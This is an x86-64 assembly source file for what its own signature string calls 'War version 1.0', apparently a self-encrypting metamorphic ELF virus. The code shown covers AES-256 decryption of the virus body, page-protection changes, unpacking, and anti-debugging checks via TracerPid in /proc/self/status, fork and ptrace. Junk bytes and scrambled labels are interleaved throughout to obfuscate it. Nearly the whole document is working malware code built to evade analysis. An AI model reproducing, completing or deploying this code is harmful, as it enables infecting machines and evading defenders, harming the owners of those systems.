; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "War version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 0x4 db 0x30
    db ':'
    .key_preview: times 0x8 db 0x30
    db ':'
    .poly_preview: times 0x10 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
signature_reg_len: equ _signature.poly_preview-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _AESD_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _UEC_OFF
    .mapaddr    resq 0x1
    .key        resb 0x20
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
keycreation_len: equ _decrypt-_virus
;-----------------------------------------------------
; Public Variables.
VARIABLES public
columns:        db "COLUMNS", 0x0
lines:          db "LINES", 0x0
procself:       db "/proc/self/status", 0x0
tracerline:     db "TracerPid:", 0x9
debugging:      db "[DEBUGGER IS RUNNING..]"
non_encrypted_len: equ _decrypt-_start
key: times 32 db 0x00
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    mjmp        ..@KDystcrGonGL
..@mFiGn4oNqLxF:
    movdqu      xmm1, OWORD [rsp+0x80]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x70]
    aesdec      xmm0, xmm1
    mjmp        ..@rp7xXjcX8IwY
db 0x37, 0xf3
..@rp7xXjcX8IwY:
    mjmp        ..@P3KmeS9tqYRs
..@Cq1BMIasAzeD:
    movr        rsp, rsp
    movr        r1, rax
    mxor        r2, r2
    mjmp        ..@z2ILLOqVErgY
..@MN9zSM3dyUjO:
    ret
    mjmp        ..@6dTmH1LOQhvE
db 0x99, 0xfa
..@6dTmH1LOQhvE:
    mjmp        Memmem
..@3SRKFWg24Vfr:
    mxor        rdi, rdi
    call        ExitProgram
    movr        rbx, rbx
    xchg        rbx, rbx
    mjmp        ..@PzG5aM3Yzg6H
db 0xc7, 0x69, 0x92
..@PzG5aM3Yzg6H:
    mjmp        ..@WKMtS2NRCBPp
db 0x5b, 0xc8
..@WKMtS2NRCBPp:
    mjmp        ..@rqV7yPPznYwa
..@Xq2ChXhOERWE:
    and         r5, PAGE_SIZE-1
    test        r5, r5
    jz          ..@Uo3iDXuP5nHD
    mjmp        ..@EYusAyrLEMdU
..@lJJXn0j3cWWR:
%ifndef ENABLE_DEBUGGING
    OFILE       [r5], 0x0
%endif
    mjmp        ..@MhuAlZ0qNtSZ
..@MhuAlZ0qNtSZ:
    mjmp        ..@sC5jMCj66x4m
..@0AbsUtoMniV7:
    push        rcx
    pop         rcx
    movdqa      OWORD [rsi+0x40], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    movr        rax, rax
    mjmp        ..@pIuzgETIe8oS
..@9rYTBJqw95ga:
    push        r2
    push        r3
    mxor        rax, rax
    mjmp        ..@5Ru88WHzjs9K
db 0x67, 0xf6, 0xf2
..@5Ru88WHzjs9K:
    mjmp        ..@ve55yOfSEjX5
Aes256KeyExpansion:
    mjmp        ..@Z6y638O6PjRb
..@n44cbE7Fpxw5:
    GGLOBAL     _decrypt
    movr        rax, rax
    xchg        rdx, rdx
    movr        r1, r5
    GGLOBAL     virus_len
    mjmp        ..@7ry5XvBxxqQ9
..@mwbzpQQDAEjc:
    mxor        r1, r1
    call        ExitProgram
    mjmp        ..@EtfrQR2Dix1s
db 0x09, 0x16, 0x25
..@EtfrQR2Dix1s:
    mjmp        ..@LRsXf4E4hVZN
..@xiUvjphi4JLQ:
    pxor        xmm3, xmm4
    pslldq      xmm4, 0x4
    pxor        xmm3, xmm4
    xchg        rax, rax
    mjmp        ..@F4I9LtUrH5eL
db 0x4f, 0xd1
..@F4I9LtUrH5eL:
    mjmp        ..@ePqFAwr9beoo
..@PIkXOQ7J2COz:
    je          ..@Z1Rljxr5dvfU
    sub         al, BYTE [r2]
    mjmp        ..@dg1EbfgGq9aA
    mjmp        ..@Z1Rljxr5dvfU
..@dJn8IBA4az39:
    aeskeygenassist xmm2, xmm3, 0x10
    call        ..@Oe6GNUw2otOE
    movdqa      OWORD [rsi+0xa0], xmm1
    mjmp        ..@e3xJsUsz3S87
db 0x2e, 0xd0
..@e3xJsUsz3S87:
    mjmp        ..@WDgrP31TyAeL
AntiDebugging:
    mjmp        ..@pTWVDakDGomJ
..@QH85kfSHBiZz:
    xchg        rbx, rbx
    movr        rsi, r5
    push        rdx
    pop         rdx
    mjmp        ..@0Ps4nMg2x45H
db 0x01, 0x93, 0xd0
..@0Ps4nMg2x45H:
    mjmp        ..@4IZKf6PQ4gJF
..@yDl4QV5hUDGO:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x80],xmm0
    movdqu      xmm1, OWORD [rsp+0x90]
    aesimc      xmm0,xmm1
    mjmp        ..@buTKSfz01YZd
db 0xcc, 0x2a, 0xb6
..@buTKSfz01YZd:
    mjmp        ..@1wPfh8FTKA47
..@e8VNMpCLxUpa:
%ifndef ENABLE_DEBUGGING
    push        rsi
    pop         rsi
    push        rbx
    pop         rbx
%endif
    mjmp        ..@VNP3PIEKlLdB
..@BUrowsxBZTss:
    mxor        rax, rax
    mxor        r2, r2
    mxor        r3, r3
    GGLOBAL     _decrypt
    movr        r1, r5
    mjmp        ..@ee4dO70jRCtz
db 0x4b, 0x47
..@ee4dO70jRCtz:
    mjmp        ..@jrYPLdBW61K2
..@yfErrB6iNL8X:
    jl          ..@Cq1BMIasAzeD
    test        eax, eax
    jz          ..@lAtLjwRugT7N
    mjmp        ..@Cq1BMIasAzeD
..@2w2vXqiOTea5:
    call        Processes
    mjmp        ..@PaTZJCL4SuQz
..@5Jje0FbAgYB0:
    pxor        xmm1, xmm4
    pxor        xmm1, xmm2
    movr        rsp, rsp
    ret
    mjmp        ..@rOempguO01Nl
..@7N0SNQbRXxAK:
    pop         r3
    mjmp        ..@3JNMEsSo5nDQ
..@tdyBek0PCljl:
    GGLOBAL     virus_len
    cmp         DWORD [r5], 0x00000000
    mjmp        ..@Z1Hd8PEvfmD8
db 0xe6, 0xc7, 0x5e
..@Z1Hd8PEvfmD8:
    mjmp        ..@nHbLXIsjFr32
..@v0GYV1o1Rf9D:
    pxor        xmm0, xmm1
    mjmp        ..@NYdiz71PftOo
db 0xb1, 0xa6
..@NYdiz71PftOo:
    mjmp        ..@4gQV0beL4HiH
..@9LGyDPwB8wre:
    sub         r1, QWORD [r5]
    mjmp        ..@s6Aoax5Ucsa7
..@itgalRbVNFIu:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xchg        rcx, rcx
%endif
%endif
    mjmp        ..@vZXggNdBzBbh
db 0x41
..@vZXggNdBzBbh:
    mjmp        ..@eBZn91ctDnNc
..@VGCahq9S3qgp:
    movdqu      xmm1, OWORD [rsp+0x50]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x40]
    xchg        rsi, rsi
    aesdec      xmm0, xmm1
    mjmp        ..@uUCkn9zABHvp
..@8ZPCWTySmNIb:
%ifndef ENABLE_DEBUGGING
    VAR         public, tracerline
    push        rdx
%endif
    mjmp        ..@LoJghjDvXFc7
db 0x0a
..@LoJghjDvXFc7:
    mjmp        ..@Wu7ylAEcxU3F
..@DQGQDb0RvCxE:
    mxor        rax, rax
    movv        rax, SYS_FORK
    syscall
    mjmp        ..@z14OrePZBOax
db 0xd5
..@z14OrePZBOax:
    mjmp        ..@YtRm5C9GcNep
..@tiiHR9s00Gde:
    movdqa      OWORD [rsi+0x20], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@rOempguO01Nl
    mjmp        ..@RDGo3BkdpC3l
db 0x67
..@RDGo3BkdpC3l:
    mjmp        ..@rfFt0fsADvUw
..@vw7u4mDB64Co:
    call        ..@rOempguO01Nl
    movdqa      OWORD [rsi+0xb0], xmm3
    mjmp        ..@RjN4o2mftkzy
db 0xd1, 0x67, 0x22
..@RjN4o2mftkzy:
    mjmp        ..@UlAD8ZCdBFjh
..@iAzE61Qz1fYV:
    aesdec      xmm0, xmm1
    mjmp        ..@YIDxy7Jk5vhg
db 0xf7, 0x8b, 0xb2
..@YIDxy7Jk5vhg:
    mjmp        ..@gMW5zfI3KgYK
..@o6WK1jHQrdVc:
    push        rdx
    mjmp        ..@PgXge4hcZOXS
..@r611pZ0rrXCU:
    push        rbx
    pop         rbx
    VAR         public, _virus
    movr        r2, r5
    movv        r3, keycreation_len
    mjmp        ..@dbshHBxvyfw8
..@LRsXf4E4hVZN:
    VAR         public, key
    mjmp        ..@0RIZ4sxxVOYu
db 0x45, 0xf0, 0x6e
..@0RIZ4sxxVOYu:
    mjmp        ..@nxIvB0XXPO24
..@AfPy69NsKqLL:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    cmp         eax, 0x0
    jl          ..@ruxMpZKgaZ48
    test        eax, eax
%endif
%endif
    mjmp        ..@PuVIuYqyfsKs
..@0Q8znHj7sL7u:
    movr        rcx, rcx
    mjmp        ..@3SRKFWg24Vfr
..@nSkMZ4YpaFjW:
    jl          ..@YQt7oOXDTLCB
    madd        rsp, _AESD_OFF_size+0x100
    leave
    ret
    mjmp        ..@T57k3hSic66A
db 0x3e, 0x98
..@T57k3hSic66A:
    mjmp        ..@VJ7sT0IUqBeu
db 0xaa, 0x32, 0x5a
..@VJ7sT0IUqBeu:
    mjmp        DecryptExecutableCode
..@6Mr3kSZLjMRz:
    pop         rax
    mjmp        ..@Xb35Y4E3Hsug
..@3JNMEsSo5nDQ:
    ret
    mjmp        ..@XQGaSuR59k1d
db 0xaa
..@XQGaSuR59k1d:
    mjmp        Aes256KeyExpansion
..@TfouvkaDy1Wl:
%ifndef ENABLE_DEBUGGING
    movv        r1, 0x1
    movv        rax, SYS_WRITE
    xchg        rdx, rdx
%endif
    mjmp        ..@mvX6998lRwYI
db 0x00, 0x2f
..@mvX6998lRwYI:
    mjmp        ..@8e58i0uv0sEz
..@Z6y638O6PjRb:
    movdqu      xmm1, [rdi]
    movdqu      xmm3, [rdi+0x10]
    mjmp        ..@ZtPeeb2c4NQ0
..@68Ojn883JxX5:
    jl          ..@JZG4K5Kto9wu
    mjmp        ..@4Xzb042gtfEL
db 0xcc, 0xc0, 0x07
..@4Xzb042gtfEL:
    mjmp        ..@cCNPLEIwpUUP
..@uH6WvjgZs9wC:
%ifndef ENABLE_DEBUGGING
    push        rbx
    pop         rbx
%endif
    mjmp        ..@JDvm3xn9cuSQ
db 0x14
..@JDvm3xn9cuSQ:
    mjmp        ..@p2TowVgfWF12
db 0x39, 0x99, 0x62
..@p2TowVgfWF12:
    mjmp        ..@z8XwaMU5jr76
..@6Pz57MnVh9FX:
    mov         rsi, QWORD [rsp+_AESD_OFF.startaddr]
    mjmp        ..@5tMzENG8tMZL
db 0x93, 0x11
..@5tMzENG8tMZL:
    mjmp        ..@VKRm9RHQlpv3
db 0x9a, 0x0b
..@VKRm9RHQlpv3:
    mjmp        ..@54fGfByMSpWK
..@ufn8WThei6uv:
    xchg        rbx, rbx
    mjmp        ..@9LGyDPwB8wre
..@GKBWLhJ1YxbJ:
    cmp         QWORD [r5], 0x0000000000000000
    mjmp        ..@NCmkQ4c2FBnN
..@9r4jx3RMpfTk:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x30],xmm0
    movdqu      xmm1, OWORD [rsp+0x40]
    aesimc      xmm0,xmm1
    mjmp        ..@56ibPxks5Fm3
..@la2YfDOYtYw3:
    rep         cmpsb
    mjmp        ..@1MOfwvfr6xau
..@IYjuyxHV9oDb:
    xchg        rdi, rdi
    mjmp        ..@HihmuLrCI0or
..@POjqVxRHaVOJ:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    cmp         rax, 0x00
    jle         ..@ruxMpZKgaZ48
    movv        rax, SYS_GETPPID
%endif
%endif
    mjmp        ..@JnODFLwQCgMo
db 0xe2
..@JnODFLwQCgMo:
    mjmp        ..@PQIAHOwn7uou
..@lAtLjwRugT7N:
    mxor        rax, rax
    mjmp        ..@ZL9AJDpL6sa2
db 0xc0, 0xc4
..@ZL9AJDpL6sa2:
    mjmp        ..@JdzC804UtjGH
db 0x9b, 0x1d
..@JdzC804UtjGH:
    mjmp        ..@qt0G5qWq0P9k
..@dbshHBxvyfw8:
    call        Aes256KeyCreation
    rep         nop
    mjmp        ..@S2hUEJE5PE6C
..@rfFt0fsADvUw:
    push        rcx
    mjmp        ..@46gKMNcE7jVw
db 0x97
..@46gKMNcE7jVw:
    mjmp        ..@IyM71VpcI2d3
db 0x14
..@IyM71VpcI2d3:
    mjmp        ..@SJE26YgyGOFf
..@OggLhC6npAwX:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xchg        rsp, rsp
    movr        rbx, rbx
    movv        rax, SYS_GETPPID
    syscall
%endif
%endif
    mjmp        ..@zRBVIXTvnwcD
db 0x39, 0xe1, 0xa2
..@zRBVIXTvnwcD:
    mjmp        ..@QVZx9eQWK7pz
Strlen:
    mjmp        ..@Fpr2Lna9QGmM
..@kdAP0xIJ5wzB:
    mjmp        ..@ICqUmhhIpAts
    mjmp        ..@Cg2wzgNDwOBQ
db 0x14
..@Cg2wzgNDwOBQ:
    mjmp        ..@yjCxVWQkHhuY
db 0xdc
..@yjCxVWQkHhuY:
    mjmp        ..@dS3c6Op1kyPy
db 0x94, 0x96
..@dS3c6Op1kyPy:
    mjmp        ..@JZG4K5Kto9wu
..@FMsIYEH5Fgry:
    mxor        rax, rax
    mjmp        ..@dg1EbfgGq9aA
..@sC5jMCj66x4m:
%ifndef ENABLE_DEBUGGING
    cmp         eax, 0x3
    jl          ..@ruxMpZKgaZ48
%endif
    mjmp        ..@ZKJa15iRieL2
..@ZKJa15iRieL2:
    mjmp        ..@yLPppBcYSt5F
..@HFmE2Y3Q97aV:
    jne         ..@Pb4COLXkk29e
    madd        rdi, bytes
    mov         m4, rdi
    mjmp        ..@Q7GAAPpTpNTq
..@NCmkQ4c2FBnN:
    je          ..@rqV7yPPznYwa
    mjmp        ..@GBgrsPqc3kWz
db 0x93, 0x9d, 0x3d
..@GBgrsPqc3kWz:
    mjmp        ..@XGKUfeOyuppo
db 0x09, 0x29
..@XGKUfeOyuppo:
    mjmp        ..@DQGQDb0RvCxE
..@374OF6e5lSnc:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_FORK
%endif
%endif
    mjmp        ..@AfPy69NsKqLL
..@gMW5zfI3KgYK:
    push        rdi
    push        rax
    pop         rax
    pop         rdi
    mjmp        ..@R12NUqpKyssQ
db 0xa1
..@R12NUqpKyssQ:
    mjmp        ..@xMotKtC2y8jc
db 0x26
..@xMotKtC2y8jc:
    mjmp        ..@HCdKRLb9TaNa
..@WDgrP31TyAeL:
    push        rax
    mjmp        ..@f255lQpIRJ6S
db 0xd9, 0x8f
..@f255lQpIRJ6S:
    mjmp        ..@6Mr3kSZLjMRz
..@Pb4COLXkk29e:
    madd        rdi, bytes
    cmp         QWORD [rdi], 0x00
    mjmp        ..@Q8hiK8zSJRMx
db 0xf9, 0xfa
..@Q8hiK8zSJRMx:
    mjmp        ..@HFmE2Y3Q97aV
..@o3E9lq44y7Xq:
    mxor        r2, r2
    mjmp        ..@zqfmTRlQa3Iv
db 0x17
..@zqfmTRlQa3Iv:
    mjmp        ..@0nbD1g7VBKfu
db 0xa8
..@0nbD1g7VBKfu:
    mjmp        ..@zgXw7aWvdl5P
..@nxIvB0XXPO24:
    movr        rsp, rsp
    mjmp        ..@dDBdOrYPj7An
db 0x67
..@dDBdOrYPj7An:
    mjmp        ..@f51C9uA6NWeH
db 0x87
..@f51C9uA6NWeH:
    mjmp        ..@GTceK922GAnu
db 0x38, 0x4b
..@GTceK922GAnu:
    mjmp        ..@QH85kfSHBiZz
..@EFBAKLgKsfX7:
    mov         rdi, QWORD [rsp+3*bytes]
    xchg        rdx, rdx
    mjmp        ..@OBgSyFz7o4Dq
DecryptExecutableCode:
    mjmp        ..@tdyBek0PCljl
..@Q7GAAPpTpNTq:
    call        AntiDebugging
    mjmp        ..@082iMbpvZyeL
db 0x92, 0xfc, 0xf5
..@082iMbpvZyeL:
    mjmp        ExitProgram
..@dg1EbfgGq9aA:
    pop         r3
    mjmp        ..@atsQGJMmEaHq
db 0x87, 0xb2, 0x22
..@atsQGJMmEaHq:
    mjmp        ..@vI69xx5ad5nE
..@lGJ7brzlBEkD:
    aeskeygenassist xmm2, xmm3, 0x8
    mjmp        ..@wp4upqWz8TpW
..@jrYPLdBW61K2:
    movv        r3, 111b
    and         r1, ~(PAGE_SIZE-1)
    movr        r4, r5
    mjmp        ..@tGBQj4IHhrVV
..@uUCkn9zABHvp:
    movdqu      xmm1, OWORD [rsp+0x30]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x20]
    xchg        rax, rax
    aesdec      xmm0, xmm1
    mjmp        ..@h4gVa6N5Mag3
..@SzJ2pu999t9T:
    mxor        r3, r3
    mxor        r4, r4
    mjmp        ..@V5wSFNfolzU2
..@YIl7watW1jNi:
    movr        rbp, rsp
    mjmp        ..@OMNmqwpAAcVi
..@AwcCP9yuzy6f:
    madd        r2, 1
    mjmp        ..@Uo3iDXuP5nHD
..@HhYjL8migDI0:
    msub        rsp, _UEC_OFF_size
    mjmp        ..@hpnrzl2ONMCB
db 0x6e, 0x94, 0xa1
..@hpnrzl2ONMCB:
    mjmp        ..@wFMdnWYbgZmU
db 0x14
..@wFMdnWYbgZmU:
    mjmp        ..@BUrowsxBZTss
..@KEQKp98K26wl:
%ifndef ENABLE_DEBUGGING
    movv        r3, debugging_size
%endif
    mjmp        ..@gVD2hfTmJOO3
db 0xcd
..@gVD2hfTmJOO3:
    mjmp        ..@WSZwLz8MEd4e
db 0x65
..@WSZwLz8MEd4e:
    mjmp        ..@G5Uviwh0I51y
db 0x85, 0xf5, 0x2c
..@G5Uviwh0I51y:
    mjmp        ..@D00L1hiQ1rWJ
..@Iz9eZnfva9JE:
    aesdeclast  xmm0, xmm1
    push        rsi
    pop         rsi
    movdqu      [rsi+rcx], xmm0
    madd        rcx, 0x10
    mjmp        ..@IYjuyxHV9oDb
..@vI69xx5ad5nE:
    pop         r2
    pop         r1
    ret
    mjmp        GetEnv
..@DkMDgTsAFtrQ:
    mxor        rax, rax
    movv        rax, SYS_MPROTECT
    mjmp        ..@JpI15ipGfUyd
db 0x2a
..@JpI15ipGfUyd:
    mjmp        ..@QjqWU7jGEGDh
..@haMcQmlaNy7D:
    call        Aes256Decryption
    mjmp        UnpackExecutableCode
    mjmp        ..@TOSpdX6tOH9G
db 0x88
..@TOSpdX6tOH9G:
..@xT8JRbevcdfC:
%ifndef ENABLE_DEBUGGING
    jnz         ..@Vsxcl75EA1hN
    VAR         public, lines
    movr        r1, r5
    call        GetEnv
    test        rax, rax
%endif
    mjmp        ..@e8VNMpCLxUpa
..@ZCZiRSX8XCd5:
    movdqu      xmm1, OWORD [rsp]
    xchg        rbx, rbx
    mjmp        ..@xUAGC6N2rJ0b
db 0xd9
..@xUAGC6N2rJ0b:
    mjmp        ..@Iz9eZnfva9JE
..@HwOErDXzkwBH:
%ifndef ENABLE_DEBUGGING
    movv        r4, tracerline_size
%endif
    mjmp        ..@N7j7Vzizrnyc
..@Uq47te82GFiz:
    push        r1
    mjmp        ..@qXxXBDcyaonM
db 0xb6
..@qXxXBDcyaonM:
    mjmp        ..@9rYTBJqw95ga
ExitProgram:
    mjmp        ..@v5x4DXZbdpml
..@Xb35Y4E3Hsug:
    aeskeygenassist xmm2, xmm1, 0x0
    mjmp        ..@P9vF7wgF3k7o
db 0x0c
..@P9vF7wgF3k7o:
    mjmp        ..@xgLE7cKZsnd9
db 0x21, 0x16
..@xgLE7cKZsnd9:
    mjmp        ..@7GP3wd5hkttx
db 0x3a
..@7GP3wd5hkttx:
    mjmp        ..@o2v7G0kZXcMB
db 0xb3
..@o2v7G0kZXcMB:
    mjmp        ..@vw7u4mDB64Co
..@bcEJDAVwuSAM:
    pop         rbx
    mjmp        ..@PNhdhBn0iWsN
..@XP21RVvPheR7:
    movdqu      xmm1, OWORD [rsp+0xa0]
    mjmp        ..@AXmei20hxNLe
..@feUTQq0NxT3a:
    mjmp        ..@PNhdhBn0iWsN
    mjmp        ..@o3E9lq44y7Xq
..@s6Aoax5Ucsa7:
    DESTROY_MX_VAR
    mjmp        ..@KFl2LevVzCRD
..@uwKnNS7kqoNX:
    call        Strncmp
    push        rdi
    pop         rdi
    push        rdx
    mjmp        ..@z9VfdN2eNicu
..@oe46jt41nr7o:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        r4, r4
%endif
%endif
    mjmp        ..@nwX3gvSzlDqk
db 0x97
..@nwX3gvSzlDqk:
    mjmp        ..@Yjy1mFAVcSlT
..@pTWVDakDGomJ:
    mxor         r1, r1
    mxor         r2, r2
    mjmp        ..@xtFAvFXWoWhD
..@EYusAyrLEMdU:
    or          r2, PAGE_SIZE-1
    mjmp        ..@AwcCP9yuzy6f
..@zgXw7aWvdl5P:
    movr        rax, r2
    pop         r1
    mjmp        ..@A2vZmK9pc2Gg
db 0xee, 0x1a
..@A2vZmK9pc2Gg:
    mjmp        ..@2OAlZquWUPSb
..@5mm9oxyIi6Tq:
    xchg        rbx, rbx
    aeskeygenassist xmm2, xmm1, 0x0
    mjmp        ..@ffSosBU96Chs
..@X5eXLF9AuO2v:
    push        rdi
    mjmp        ..@1u5DpY9FrMIy
..@mtG0i0HdtWlo:
%ifndef ENABLE_DEBUGGING
    movr        rbp, rbp
    msub        rsp, 0x1000
    movr        rax, rax
    VAR         public, procself
%endif
    mjmp        ..@lJJXn0j3cWWR
..@QdIVh4xvmJ6T:
    cmp         eax, 0x00
    je          ..@LRsXf4E4hVZN
    mjmp        ..@mwbzpQQDAEjc
..@1hofDxf4JHq8:
    movdqa      xmm4, xmm3
    pslldq      xmm4, 0x4
    pxor        xmm3, xmm4
    pslldq      xmm4, 0x4
    mjmp        ..@xiUvjphi4JLQ
..@8GRID5TNru9x:
    VAR         public, _start
    mjmp        ..@xk2gYwFWyVpH
..@4IZKf6PQ4gJF:
    lea         rdi, [rsp+_UEC_OFF.key]
    mjmp        ..@gok3An5a2Cem
..@CSx0MLDeuT28:
    pslldq      xmm4, 0x4
    pxor        xmm1, xmm4
    pslldq      xmm4, 0x4
    mjmp        ..@ZM9zl0tvbAiT
..@KDystcrGonGL:
    pop         rdi
    xchg        rsi, rsi
    msub        rdi, 1
    msub        rdi, 0x5
    INIT_MX_VAR
    mjmp        ..@ORXQwJHvgdXc
..@GQQY4xqK7ReZ:
    aesdec      xmm0, xmm1
    xchg        rsp, rsp
    mjmp        ..@mFiGn4oNqLxF
..@ruxMpZKgaZ48:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        r1, rax
    call        ExitProgram
    push        rax
    pop         rax
%endif
%endif
    mjmp        ..@KmFF1d04f1s5
db 0xd1
..@KmFF1d04f1s5:
    mjmp        ..@Ovs9eZJWSEqF
..@9b763qUKVWI3:
    push        r1
    movr        rdx, rdx
    push        r2
    push        r3
    push        r4
    mjmp        ..@50twtr7KIRDs
db 0xa7, 0x1b, 0xcb
..@50twtr7KIRDs:
    mjmp        ..@EFBAKLgKsfX7
..@oFFNhGjiOKYs:
    aeskeygenassist xmm2, xmm3, 0x4
    mjmp        ..@CMEz4k5r0zoe
..@TAXuy1E4Kvj9:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x20],xmm0
    movdqu      xmm1, OWORD [rsp+0x30]
    push        rdx
    pop         rdx
    mjmp        ..@9r4jx3RMpfTk
..@PuVIuYqyfsKs:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jz          ..@OggLhC6npAwX
%endif
%endif
    mjmp        ..@wzwiPjKXPjTT
..@PNhdhBn0iWsN:
    mov         r1, QWORD [rsp]
    xchg        rbx, rbx
    mov         r2, QWORD [r4]
    test        r2, r2
    jz          ..@o3E9lq44y7Xq
    mjmp        ..@KhFnmuzu4pcm
db 0xd4, 0xf0
..@KhFnmuzu4pcm:
    mjmp        ..@uwKnNS7kqoNX
..@amXbR565Pd8N:
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x90]
    push        rcx
    movr        rsi, rsi
    pop         rcx
    mjmp        ..@GQQY4xqK7ReZ
..@Va6niAvEYxFz:
    pop         rax
    movdqu      OWORD [rsp+0xa0],xmm0
    movdqu      xmm1, OWORD [rsp+0xb0]
    aesimc      xmm0,xmm1
    mjmp        ..@Q8M5nmDvJxX1
..@ve55yOfSEjX5:
    mov         al, BYTE [r1]
    cmp         BYTE [r2], al
    mjmp        ..@PIkXOQ7J2COz
..@7ry5XvBxxqQ9:
    mov         r2d, DWORD [r5]
    msub        r2, non_encrypted_len
    push        rbx
    pop         rbx
    mjmp        ..@9cEZqJjbLlEx
..@QjqWU7jGEGDh:
    syscall
    mjmp        ..@uoBdlD1luRvK
db 0xd5
..@uoBdlD1luRvK:
    mjmp        ..@QdIVh4xvmJ6T
..@ffSosBU96Chs:
    call        ..@rOempguO01Nl
    movdqa      OWORD [rsi+0xd0], xmm3
    mjmp        ..@ptYMD7yGuiQg
..@rqV7yPPznYwa:
    mjmp         DecryptExecutableCode
    mjmp        ..@yvwva0AmKDhj
db 0xf3, 0x94, 0x30
..@yvwva0AmKDhj:
    mjmp        ..@i4TkRuucJjy6
db 0x6f
..@i4TkRuucJjy6:
    mjmp        Strlen
..@VNP3PIEKlLdB:
%ifndef ENABLE_DEBUGGING
    push        rdx
    pop         rdx
%endif
    mjmp        ..@uH6WvjgZs9wC
..@Htn63jeBV5H9:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_PTRACE
    syscall
    test        rax, rax
    jnz         ..@ruxMpZKgaZ48
%endif
%endif
    mjmp        ..@uKTbKfI8B1zC
db 0xc8, 0x59
..@uKTbKfI8B1zC:
    mjmp        ..@RuSsoGmQRIql
db 0xef
..@RuSsoGmQRIql:
    mjmp        ..@iPIIsxcGT9Ea
..@P3KmeS9tqYRs:
    movdqu      xmm1, OWORD [rsp+0x60]
    aesdec      xmm0, xmm1
    mjmp        ..@2gjvUsRHLhw6
db 0x0b, 0x3a
..@2gjvUsRHLhw6:
    mjmp        ..@kRhMwncsKcWl
db 0x8d
..@kRhMwncsKcWl:
    mjmp        ..@VGCahq9S3qgp
..@ijk8zo3igc6z:
    GGLOBAL     virus_len
    mjmp        ..@j29hmatfYjGS
db 0xac, 0x9a
..@j29hmatfYjGS:
    mjmp        ..@DFVJGoJ94VZl
..@LAeg5Mc7lkqI:
    and         r3, 0ffffffffffffffe0h
    push        r3
    movdqu      xmm0, OWORD [r1]
    movdqu      xmm1, OWORD [r1+0x10]
    mjmp        ..@NltQzlMVFlHC
db 0x0a, 0x25
..@NltQzlMVFlHC:
    mjmp        ..@bjp58Ff6CAfu
..@LVPXzXadDZ4o:
%ifndef ENABLE_DEBUGGING
    push        rdi
%endif
    mjmp        ..@e6LoWsVvSvlj
db 0x3d
..@e6LoWsVvSvlj:
    mjmp        ..@EZW4ctZxOySL
..@xk2gYwFWyVpH:
    movr        r1, r5
    VAR         public, entrypoint
    mjmp        ..@r18573ysNqVW
db 0x09, 0x85, 0x86
..@r18573ysNqVW:
    mjmp        ..@4K6zPDWrsFi6
db 0x6d, 0xf7, 0x29
..@4K6zPDWrsFi6:
    mjmp        ..@ufn8WThei6uv
..@9JQte34YL82G:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        rsp, rsp
%endif
%endif
    mjmp        ..@61it8Ilag9sZ
db 0xa8
..@61it8Ilag9sZ:
    mjmp        ..@shniqkupqRjR
..@eBZn91ctDnNc:
    GGLOBAL     entrypoint
    mjmp        ..@wyIIgEic6zRK
db 0x6e, 0x4c
..@wyIIgEic6zRK:
    mjmp        ..@GKBWLhJ1YxbJ
Memmem:
    mjmp        ..@9b763qUKVWI3
..@oPpzbZCXNEPA:
    xchg        rsp, rsp
    call        ..@rOempguO01Nl
    movdqa      OWORD [rsi+0x90], xmm3
    push        rcx
    mjmp        ..@4v9BMwhWzOdX
..@P4q1izHW4no5:
    pop         rdx
    movdqu      xmm1, OWORD [rsp+0xd0]
    aesimc      xmm0,xmm1
    mjmp        ..@U5VLgzy4fVkH
..@oCvbpPLuV3Tu:
    movdqu      OWORD [rsp+0x60],xmm0
    movdqu      xmm1, OWORD [rsp+0x70]
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x70],xmm0
    movdqu      xmm1, OWORD [rsp+0x80]
    mjmp        ..@jQGSYSBJdeUg
db 0xc3, 0x84
..@jQGSYSBJdeUg:
    mjmp        ..@yDl4QV5hUDGO
..@tGBQj4IHhrVV:
    sub         r4, r1
    mjmp        ..@VsU3SAcCfAkT
db 0xff
..@VsU3SAcCfAkT:
    mjmp        ..@ijk8zo3igc6z
..@4v9BMwhWzOdX:
    pop         rcx
    mjmp        ..@dJn8IBA4az39
..@cH92XvOYDijS:
    movr        rbp, rbp
    mjmp        ..@U8VD4bidZZ9P
